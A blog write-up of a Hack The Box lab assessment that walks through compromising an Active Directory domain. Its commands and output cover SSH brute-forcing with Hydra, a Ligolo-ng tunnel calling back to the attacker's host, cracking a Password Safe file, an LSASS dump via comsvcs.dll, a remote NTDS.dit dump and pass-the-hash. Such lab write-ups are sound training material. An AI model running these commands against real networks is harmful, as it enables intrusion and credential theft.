---
title: "Writeup Hack The Box: Skills Assessment - Password Attacks"
date: 2025-12-19 10:35:00 -0500
categories: [SkillsAssessment, HTB]
tags: [pivoting, active_directory, password_attacks]
image:
  path: /assets/img/passwordattacks/password_attacks_main.webp
---

**Hello everyone, welcome back!**

I hope you are all having an amazing time during the Christmas and end-of-year holidays. Merry Christmas and a Happy New Year 2026 🎄🎉 (yes, already 2026… time flies faster than an Nmap scan with -T5).

As part of my preparation for the eCPPT v3 certification, I’ve been working through several Active Directory modules on Hack The Box. I decided to write a blog post about this specific module because I genuinely enjoyed the final assessment — it ties together multiple AD concepts in a very realistic way.

With that said… let’s get started.

## Initial Access – DMZ01

According to the HTB assessment description, an employee named `Betty Jayde` works at the company Nexura LLC (this will be useful later when identifying the Active Directory domain). The assessment also conveniently gives us her password `Texas123!@#`

So far, so good — initial access should be straightforward, right?

Well… not quite. At this point, we don’t actually know:
* The exact username
* Nor the service we need to authenticate to

But don’t worry, we’ll fix that shortly.

### Nmap Scanning

```bash
$ sudo nmap -sS -sVC -p- --min-rate 5000 10.129.234.116
Nmap scan report for 10.129.234.116 (10.129.234.116)
Host is up (0.100s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 71:08:b0:c4:f3:ca:97:57:64:97:70:f9:fe:c5:0c:7b (RSA)
|   256 45:c3:b5:14:63:99:3d:9e:b3:22:51:e5:97:76:e1:50 (ECDSA)
|_  256 2e:c2:41:66:46:ef:b6:81:95:d5:aa:35:23:94:55:38 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.55 seconds
```
{: .nolineno }

After running an Nmap scan against the target, we discover that only one port is open:
* Port 22 – SSH

The host is running Ubuntu Linux. This immediately narrows our options. Since SSH is our only entry point, we can safely assume that Betty’s credentials are meant to be used there.

### Username Generation

Now we know the password, but not the username.
Based on the employee’s name, we can generate a list of potential usernames using Username Anarchy (which, let’s be honest, is a pretty cool name for a tool).

```bash
$ git clone https://github.com/urbanadventurer/username-anarchy.git
$ cd username-anarchy
$ ./username-anarchy Betty Jayde > usernames.txt
```
{: .nolineno }

This gives us a list of possible username permutations derived from Betty Jayde.

### Brute-Forcing the Correct Username

With the password already known, we can use Hydra to brute-force the correct username over SSH.

```bash
$ hydra -L usernames.txt -p 'Texas123!@#' 10.129.234.116 -t 6 ssh
[DATA] max 6 tasks per 1 server, overall 6 tasks, 15 login tries (l:15/p:1), ~3 tries per task
[DATA] attacking ssh://10.129.234.116:22/
[22][ssh] host: 10.129.234.116   login: jbetty   password: Texas123!@#
1 of 1 target successfully completed, 1 valid password found
```
{: .nolineno }

And… Bingo 🎯
In just a few moments, we identify the correct username.

Using these credentials, we successfully log in via SSH to DMZ01.

```bash
$ ssh jbetty@10.129.234.116                            
jbetty@10.129.234.116's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)
[...]
Last login: Thu May 29 20:34:11 2025 from 10.10.16.12
jbetty@DMZ01:~$
```
{: .nolineno }

## Pivoting Setup
The module mentions that the remaining machines are located in an internal network, which we cannot access directly from our Kali machine.
Therefore, DMZ01 must be used as a pivot host.

For this scenario, I decided to use Ligolo-ng. I had already used Chisel many times before, and honestly… using the same tool over and over again gets boring. Ligolo-ng is a great alternative and works beautifully.

### Creating the TUN Interface (Kali)

First, we create a TUN interface on our Kali machine:

```bash
$ sudo ip tuntap add user $USER mode tun ligolo
$ sudo ip link set ligolo up
$ sudo ip route add 172.16.119.0/24 dev ligolo
```
{: .nolineno }

> Hint. For the last command, we specifically use the CIDR range: 172.16.119.0/24 You can identify this range by running `ip a` on DMZ01. This is the internal network we want to reach.
{: .prompt-tip }

### Ligolo-ng Setup

Next, we download the Ligolo-ng proxy and agent binaries for Linux from the official GitHub repository.

On Kali, we execute the proxy binary:

```bash
$ ./proxy -selfcert                   
INFO[0000] Loading configuration file ligolo-ng.yaml    
WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
INFO[0000] Listening on 0.0.0.0:11601                   
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

  Made in France ♥            by @Nicocha30!
  Version: 0.8.2

ligolo-ng » 
```
{: .nolineno }

Then, we transfer the agent binary to DMZ01 via SCP and execute it:

```bash
$ scp ./agent jbetty@10.129.234.116:/home/jbetty
jbetty@DMZ01:~$ ./agent -connect 10.10.15.181:11601 -ignore-cert
WARN[0000] warning, certificate validation disabled     
INFO[0000] Connection established                        addr="10.10.15.181:11601"
```
{: .nolineno }

> Remember to use your Kali IP address, and note that the port is displayed when running the proxy binary.
{: .prompt-info }

Back on our Kali terminal, we can see that the agent has successfully connected:

```bash
ligolo-ng » INFO[0177] Agent joined. id=005056b06497 name=jbetty@DMZ01 remote="10.129.234.116:35772"
```
{: .nolineno }

To start the tunnel, we simply run the following command inside the Ligolo shell:

```bash
ligolo-ng » session
? Specify a session : 1 - jbetty@DMZ01 - 10.129.234.116:59950 - 005056b06497
[Agent : jbetty@DMZ01] » start
INFO[0011] Starting tunnel to jbetty@DMZ01 (005056b06497)
```
{: .nolineno }

### Connectivity Test

To confirm everything is working, we try to ping the Domain Controller:

```bash
$ ping 172.16.119.11                                                                             
PING 172.16.119.11 (172.16.119.11) 56(84) bytes of data.
64 bytes from 172.16.119.11: icmp_seq=1 ttl=64 time=100 ms
64 bytes from 172.16.119.11: icmp_seq=2 ttl=64 time=99.5 ms
64 bytes from 172.16.119.11: icmp_seq=3 ttl=64 time=98.6 ms
64 bytes from 172.16.119.11: icmp_seq=4 ttl=64 time=103 ms
^C
--- 172.16.119.11 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3007ms
rtt min/avg/max/mdev = 98.620/100.297/102.941/1.621 ms
```
{: .nolineno }

As you can see, we can reach it perfectly — without using proxychains.
Clean, fast, and elegant.

## Accessing FILE01

I opened a second SSH session to DMZ01 and began enumerating the system for potential credentials or secrets. Unfortunately (or fortunately?), the credentials for `jbetty` do not work on the other servers — that would have been too easy.

While reviewing command history, something interesting appears at line 25:

```bash
jbetty@DMZ01:~$ history
[...]
25  sshpass -p "...SNIP..." ssh hwilliam@file01
[...]
```
{: .nolineno }

We now have credentials for a new user called hwilliam, intended for FILE01.
However, we still don’t know which service to use them on.

### Scanning FILE01

Thanks to Ligolo, we can scan FILE01 directly from Kali:

```bash
$ nmap -p- --min-rate 5000 172.16.119.10
Nmap scan report for 172.16.119.10 (172.16.119.10)
Host is up (0.035s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE
135/tcp  open  msrpc
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 13.29 seconds
```
{: .nolineno }

The scan reveals the following open ports:
* 135
* 445
* 3389
* 5985

Since ports 135 and 445 are open, SMB is a good place to start.
Using NetExec, we enumerate SMB shares:

```bash
$ netexec smb 172.16.119.10 -u hwilliam -p ...SNIP... --shares                   
SMB         172.16.119.10   445    FILE01           [*] Windows 10 / Server 2019 Build 17763 x64 (name:FILE01) (domain:nexura.htb) (signing:False) (SMBv1:False) 
SMB         172.16.119.10   445    FILE01           [+] nexura.htb\hwilliam:...SNIP...
SMB         172.16.119.10   445    FILE01           [*] Enumerated shares
SMB         172.16.119.10   445    FILE01           Share           Permissions     Remark
SMB         172.16.119.10   445    FILE01           -----           -----------     ------
SMB         172.16.119.10   445    FILE01           ADMIN$                          Remote Admin
SMB         172.16.119.10   445    FILE01           C$                              Default share
SMB         172.16.119.10   445    FILE01           HR              READ,WRITE      
SMB         172.16.119.10   445    FILE01           IPC$            READ            Remote IPC
SMB         172.16.119.10   445    FILE01           IT                              
SMB         172.16.119.10   445    FILE01           MANAGEMENT                      
SMB         172.16.119.10   445    FILE01           PRIVATE         READ,WRITE      
SMB         172.16.119.10   445    FILE01           TRANSFER        READ,WRITE
```
{: .nolineno }

We have access to multiple shares. I downloaded the contents of each one and performed a manual review. Inside the Archive directory, I found a very interesting file: `Employee-Passwords_OLD.psafe3`

> This file format belongs to Password Safe. It is usually encrypted and often contains stored credentials. Exactly the kind of file we love to see in CTFs.
{: .prompt-info }

### Cracking the Password Safe File

To recover the master password, I attempted to crack it using John the Ripper:

```bash
$ pwsafe2john Employee-Passwords_OLD.psafe3 > psafe.txt
$ john psafe.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (pwsafe, Password Safe [SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 262144 for all loaded hashes
Will run 5 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
michaeljackson   (Employee-Passwords_OLD)     
1g 0:00:00:28 DONE (2025-12-19 15:33) 0.03502g/s 358.6p/s 358.6c/s 358.6C/s allison1..1asshole
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
{: .nolineno }

Once we obtain the key, we can open the file using the appropriate tool:

```bash
$ sudo flatpak remote-add --if-not-exists flathub https://flathub.org/repo/flathub.flatpakrepo
$ sudo flatpak install flathub org.pwsafe.pwsafe -y
$ flatpak run org.pwsafe.pwsafe
```
{: .nolineno }

![Load the File](/assets/img/passwordattacks/password_attacks_1.webp)

![View File Content](/assets/img/passwordattacks/password_attacks_2.webp)

Eureka! 🧠
We successfully recover domain credentials for three users:

* bdavid
* stom
* hwilliam

### Accessing JUMP01
Next, we scan JUMP01:

```bash
$ nmap -p- --min-rate 5000 172.16.119.7
Nmap scan report for 172.16.119.7 (172.16.119.7)
Host is up (0.0025s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT     STATE SERVICE
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 39.66 seconds
```
{: .nolineno }

Only port 3389 (RDP) is open, which means this server is only accessible via Remote Desktop.

Out of all the credentials we obtained, only `bdavid` was able to log in successfully.

```bash
xfreerdp3 /v:172.16.119.7 /u:bdavid /p:'...SNIP...' /d:nexura.htb +clipboard +dynamic-resolution "/drive:share_folder,~/Documents/Workspace/PasswordAttacks"
```
{: .nolineno }

> I created a shared folder to transfer files easily between JUMP01 and Kali.
{: .prompt-tip }

Fortunately for us, this user has local Administrator privileges on JUMP01.

### Credential Dumping

My first attempt was to dump the SAM, SYSTEM, and SECURITY hives, but nothing useful came out of it.

So I moved on to dumping LSASS.
```powershell
C:\Windows\system32> Get-Process lsass

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
   1377      32     7696      20400       2.30    652   0 lsass


PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 652 C:\lsass.dmp full
```
{: .nolineno }

After transferring the dump file to Kali via the shared folder, I parsed it using pypykatz:

```bash
$ pypykatz lsa minidump lsass.dmp
...SNIP...
== LogonSession ==
authentication_id 347175 (54c27)
session_id 2
username stom
domainname NEXURA
logon_server DC01
logon_time 2025-12-19T19:25:52.573689+00:00
sid S-1-5-21-1333759777-277832620-2286231135-1106
luid 347175
        == MSV ==
                Username: stom
                Domain: NEXURA
                LM: NA
                NT: ...SNIP...
                SHA1: f2fc2263e4d7cff0fbb19ef485891774f0ad6031
                DPAPI: 06e85cb199e902a0145ff04963e7dd7200000000
        == WDIGEST [54c27]==
                username stom
                domainname NEXURA
                password None
                password (hex)
        == Kerberos ==
                Username: stom
                Domain: NEXURA.HTB
        == WDIGEST [54c27]==
                username stom
                domainname NEXURA
                password None
                password (hex)
        == DPAPI [54c27]==
                luid 347175
                key_guid 33fbd25b-2488-49ef-9fa2-7a96959acb95
                masterkey 0528dd7d0cfa8ca48e12bf937ab2dcd92fa588f958716a9abc6fa49444b9d580a0ab3d8f7657e4a4d327fe7df824c112ec8a3d04c22f8050e669c8f256983cda
                sha1_masterkey 1cf754450d3c0515af105fd64ef952f9486495fb
...SNIP...
```
{: .nolineno }

Eureka (again) 🎉
We recover the NT hash of the domain user `stom`.

Out of curiosity, I attempted to authenticate directly to the Domain Controller using this user and check its privileges… and I got very lucky.

Not only does the authentication work, but this user is a member of the Domain Admins group.

```bash
$ netexec ldap 172.16.119.11  -u stom -H ...SNIP... --groups          
LDAP        172.16.119.11   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:nexura.htb)
LDAP        172.16.119.11   389    DC01             [+] nexura.htb\stom:...SNIP... (Pwn3d!)
LDAP        172.16.119.11   389    DC01             Administrators                           membercount: 3
...SNIP...
```
{: .nolineno }

## Domain Controller Compromise

To spice things up a bit, I decided to remotely dump NTDS.dit using NetExec:

```bash
$ netexec smb 172.16.119.11  -u stom -H ...SNIP... -M ntdsutil
SMB         172.16.119.11   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:nexura.htb) (signing:True) (SMBv1:False) 
SMB         172.16.119.11   445    DC01             [+] nexura.htb\stom:...SNIP... (Pwn3d!)
NTDSUTIL    172.16.119.11   445    DC01             [*] Dumping ntds with ntdsutil.exe to C:\Windows\Temp\176617878
NTDSUTIL    172.16.119.11   445    DC01             Dumping the NTDS, this could take a while so go grab a redbull...
NTDSUTIL    172.16.119.11   445    DC01             [+] NTDS.dit dumped to C:\Windows\Temp\176617878
NTDSUTIL    172.16.119.11   445    DC01             [*] Copying NTDS dump to /tmp/tmpccwczk4h
NTDSUTIL    172.16.119.11   445    DC01             [*] NTDS dump copied to /tmp/tmpccwczk4h
NTDSUTIL    172.16.119.11   445    DC01             [+] Deleted C:\Windows\Temp\176617878 remote dump directory
NTDSUTIL    172.16.119.11   445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
NTDSUTIL    172.16.119.11   445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:...SNIP...:::
NTDSUTIL    172.16.119.11   445    DC01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
NTDSUTIL    172.16.119.11   445    DC01             DC01$:1002:aad3b435b51404eeaad3b435b51404ee:7a6a7e6be0b33c3c338ca8a4941b9a8d:::
NTDSUTIL    172.16.119.11   445    DC01             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:11dee8f685882eb4f78a450291569bd0:::
NTDSUTIL    172.16.119.11   445    DC01             nexura.htb\bdavid:1105:aad3b435b51404eeaad3b435b51404ee:...SNIP...:::
NTDSUTIL    172.16.119.11   445    DC01             nexura.htb\stom:1106:aad3b435b51404eeaad3b435b51404ee:...SNIP...:::
NTDSUTIL    172.16.119.11   445    DC01             nexura.htb\hwilliam:1107:aad3b435b51404eeaad3b435b51404ee:...SNIP...:::
NTDSUTIL    172.16.119.11   445    DC01             FILE01$:1108:aad3b435b51404eeaad3b435b51404ee:15f6659edbb83f5a12757a22970ec13a:::
NTDSUTIL    172.16.119.11   445    DC01             JUMP01$:1109:aad3b435b51404eeaad3b435b51404ee:b979bb06d7264f482230f05238170669:::
NTDSUTIL    172.16.119.11   445    DC01             [+] Dumped 9 NTDS hashes to None.ntds of which 6 were added to the database
NTDSUTIL    172.16.119.11   445    DC01             [*] To extract only enabled accounts from the output file, run the following command: 
NTDSUTIL    172.16.119.11   445    DC01             [*] grep -iv disabled None.ntds | cut -d ':' -f1
```

To verify access, we can perform a Pass-the-Hash attack using the local Administrator account to authenticate against the Domain Controller:

```bash
$ evil-winrm -i 172.16.119.11 -u Administrator -H ...SNIP...
                                        
Evil-WinRM shell v3.7
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
nexura\administrator
```

And… success ✅
Full domain compromise achieved.

## Final Thoughts

I hope this writeup was useful and enjoyable.
Thanks for reading, happy holidays, and as always…

Happy hacking! 🎄💻🔥